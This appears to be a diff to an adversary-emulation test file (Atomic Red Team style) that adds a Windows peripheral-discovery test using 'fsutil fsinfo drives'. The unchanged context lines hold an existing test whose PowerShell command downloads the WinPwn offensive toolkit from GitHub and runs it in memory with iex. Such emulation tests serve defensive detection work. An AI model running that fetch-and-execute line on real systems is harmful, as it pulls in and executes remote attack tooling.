@@ -24,3 +24,11 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       printercheck -noninteractive -consoleoutput
     name: powershell
+- name: Peripheral Device Discovery via fsutil
+  description: Performs pheripheral device discovery utilizing fsutil to list all drives.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      fsutil fsinfo drives
+    name: command_prompt
